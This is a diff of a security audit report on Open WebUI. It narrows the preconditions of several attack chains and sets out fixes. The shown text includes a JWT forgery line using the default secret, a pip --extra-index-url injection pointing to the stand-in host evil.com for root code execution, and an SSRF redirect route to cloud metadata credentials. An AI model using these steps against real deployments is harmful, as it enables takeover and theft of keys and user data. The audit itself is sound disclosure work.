@@ -6,28 +6,28 @@
 
 ## Executive Summary
 
-12 vulnerabilities found — 4 Critical, 6 High, 2 Medium. Live-confirmed against a Docker deployment. The worst-case scenario: unauthenticated attacker achieves persistent root RCE inside the container, steals all API keys and user data. Findings span authentication, authorization, input validation, and frontend rendering.
+12 vulnerabilities found — 4 Critical, 6 High, 2 Medium. Live-confirmed against a Docker deployment. The worst-case scenario: on an affected deployment that still exposes a bootstrap path or leaks the admin UUID, an external attacker reaches persistent root RCE inside the container and steals all API keys and user data. Findings span authentication, authorization, input validation, and frontend rendering.
 
-**Key caveat:** Attack Chains 1 and 2 require the JWT secret to be the publicly known default `t0p-s3cr3t`. Default Docker and `open-webui serve` generate a random secret. The default is active when running `open-webui dev`, `backend/dev.sh`, or bare `uvicorn open_webui.main:app` without setting `WEBUI_SECRET_KEY`. Findings 6, 7, 8, 9, 11 affect **all** deployments regardless of secret.
+**Key caveats:** Attack Chains 1 and 2 require the JWT secret to be the publicly known default `t0p-s3cr3t`. Default Docker and `open-webui serve` generate a random secret. The default is active when running `open-webui dev`, `backend/dev.sh`, or bare `uvicorn open_webui.main:app` without setting `WEBUI_SECRET_KEY`. Also, current startup disables public signup after the first user, so a pure unauthenticated entry path is not present on a normally initialized deployment unless signup is re-enabled or the attacker already knows the admin UUID. Findings 6, 7, 8, 9, 11 affect **all** deployments regardless of secret.
 
 ---
 
 ## Attack Chains
 
-### Chain 1: Unauthenticated → Root RCE + Persistent Backdoor (F1 + F10) — CVSS 9.8
+### Chain 1: Low-Privilege or Known-UUID → Root RCE + Persistent Backdoor (F1 + F10) — CVSS 9.8
 
-**Requires:** Target uses default secret (`open-webui dev`, bare uvicorn, or explicit `t0p-s3cr3t`)
+**Requires:** Target uses default secret (`open-webui dev`, bare uvicorn, or explicit `t0p-s3cr3t`) and attacker either has a low-privilege account or already knows the admin UUID. A zero-credential start additionally requires signup to still be enabled.
 
-1. Signup → leak admin email via `/auths/admin/details` (accessible even to pending users)
-2. Obtain admin UUID: if `DEFAULT_USER_ROLE=user`, use `/users/search` directly. If `pending` (default), UUID must be obtained via other means (leaked in shared chat URLs, API responses, or browser history)
+1. If signup is still enabled, create an account and leak admin email via `/auths/admin/details` (accessible even to pending users)
+2. Obtain admin UUID: if `DEFAULT_USER_ROLE=user`, use `/users/search` directly. If `pending` (default) or signup is already closed, UUID must be obtained via other means (leaked in shared chat URLs, API responses, browser history, or operator-provided value)
 3. Forge admin JWT: `jwt.encode({'id': admin_id}, 't0p-s3cr3t', 'HS256')`
 4. Create tool with `requirements: setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools`
 5. pip fetches from attacker index → `setup.py` runs as root inside container
 6. On every restart, `install_tool_and_function_dependencies()` reinstalls the payload — **persistent backdoor**
 
-**Live-confirmed:** Admin email leaked (step 1). UUID search requires verified role — fails for pending users. Steps 4-5 confirmed: injected flags stored verbatim and passed to pip.
+**Live-confirmed:** After the initial admin existed, public signup returned `403` because `signup_handler()` sets `ENABLE_SIGNUP=False` on first-user creation. Phase 1 was still live-confirmed on an affected deployment using a provided admin UUID. Steps 4-5 were live-confirmed: injected flags were passed to pip.
 
-### Chain 2: Unauthenticated → Immediate Root RCE (F1 + F12) — CVSS 9.1
+### Chain 2: Low-Privilege or Known-UUID → Immediate Root RCE (F1 + F12) — CVSS 9.1
 
 **Requires:** Same as Chain 1
 
@@ -35,7 +35,7 @@
 2. Create tool with module-level code: `import subprocess; subprocess.check_output(['id'])`
 3. `exec()` at `plugin.py:231` fires immediately — code runs as root
 
-**Live-confirmed:** Tool creation wrote `/tmp/rce_proof.txt` containing `uid=0(root)` and leaked `WEBUI_SECRET_KEY` from container env. Tested with admin token directly (UUID discovery limitation same as Chain 1).
+**Live-confirmed:** Tool creation wrote `/tmp/rce_proof.txt` containing `uid=0(root)` and leaked `WEBUI_SECRET_KEY` from container env. Tested with an admin token directly; the F1-to-F12 chain remains valid on affected deployments when the attacker can supply or derive the admin UUID.
 
 ### Chain 3: Stored XSS → Persistent Account Takeover (F9 + F8 + F6 + F7) — CVSS 8.7
 
@@ -47,7 +47,7 @@
 4. CORS reflects any origin → attacker reads API responses cross-origin
 5. Victim logs out → token still valid (revocation is no-op without Redis, default 4-week expiry)
 
-**Live-confirmed:** F6 (CORS reflection 4/4 origins), F7 (token valid post-logout), F8 (httponly inconsistency). F9 XSS confirmed via code review (upload requires verified role).
+**Live-confirmed:** F6 (CORS reflection 4/4 origins) and F7 (token valid post-logout). F8 and F9 are code-confirmed; full OAuth/browser proof was not executed in this pass.
 
 ### Chain 4: Verified User → Cloud IAM Credential Theft (F11) — CVSS 8.5
 
@@ -80,7 +80,7 @@
 | **`uvicorn open_webui.main:app`** | **Yes** — env.py fallback kicks in |
 | **Explicit `WEBUI_SECRET_KEY=t0p-s3cr3t`** | **Yes** |
 
-**Live-confirmed:** Forged admin JWT, accessed `/openai/config` and `/api/v1/users/` with full admin privileges.
+**Live-confirmed:** On an affected deployment that explicitly used `WEBUI_SECRET_KEY=t0p-s3cr3t`, a forged admin JWT accessed `/openai/config` and `/api/v1/users/` with full admin privileges. The same forged token failed on stock Docker startup.
 
 **Fix:** Remove the hardcoded fallback. Generate a random secret with `secrets.token_hex(32)` on first startup and persist to `data/.secret_key`. Raise an error if the key cannot be read or written.
 
@@ -128,7 +128,7 @@ Mermaid initialized with `securityLevel: 'loose'` (allows HTML in node labels). 
 
 `is_string_allowed()` uses `str.endswith()` against the full URL string, not the parsed hostname. More critically, `requests.get(url, stream=True)` follows HTTP 302 redirects without re-validating the destination IP. An attacker-controlled public server redirects to cloud IMDS (`169.254.169.254`). `SafeWebBaseLoader._fetch()` in the same codebase correctly sets `allow_redirects=False` — inconsistency. Any verified user can call this endpoint.
 
-**Live-confirmed:** Direct IMDS URLs correctly blocked by `validate_url()` IP check. Redirect-following bypass requires an external public server (confirmed via code review: `requests.get()` uses default `allow_redirects=True`).
+**Live-confirmed:** Direct IMDS URLs correctly blocked by `validate_url()` IP check. Redirect-following was also live-confirmed with a public redirect (`https://httpbin.org/redirect-to?...`) that ultimately returned internal content from `http://127.0.0.1:8080/api/version`. The `endsWith()` hostname bug remains code-confirmed but secondary.
 
 **Fix:** Set `allow_redirects=False` on `requests.get()` in `retrieval/utils.py:182`. Parse hostname with `urlparse().hostname` before blocklist checks.
 
@@ -254,8 +254,11 @@ OAuth callback sets JWT cookie with `httponly=False`. Password login at `auths.p
 ## Reproduction
 
 ```bash
-# Setup (sets WEBUI_SECRET_KEY=t0p-s3cr3t — not default Docker behavior)
-bash autofyn_audit/setup.sh
+# Setup lab mode for JWT-dependent chains (explicitly sets WEBUI_SECRET_KEY=t0p-s3cr3t)
+bash autofyn_audit/setup.sh 8080 forced-default-secret
+
+# Or setup stock Docker behavior for findings that do not depend on F1
+bash autofyn_audit/setup.sh 8080 default-docker
 
 # Run any exploit
 python3 autofyn_audit/exploit_jwt_forgery.py --target http://localhost:8080 --admin-id <id>
@@ -267,7 +270,7 @@ python3 autofyn_audit/exploit_token_revocation_bypass.py --target http://localho
 bash autofyn_audit/teardown.sh
 ```
 
-**Note:** Scripts that auto-discover admin ID require a verified user (pending users cannot access `/users/search`). Pass `--admin-id` or `--token` to skip auto-discovery.
+**Note:** Current startup disables public signup after the first user. Scripts that auto-discover admin ID therefore require either signup to be re-enabled or an existing low-privilege account. Pass `--admin-id`, `--token`, or `--user-token` to skip those bootstrap assumptions where supported.
 
 ---
 
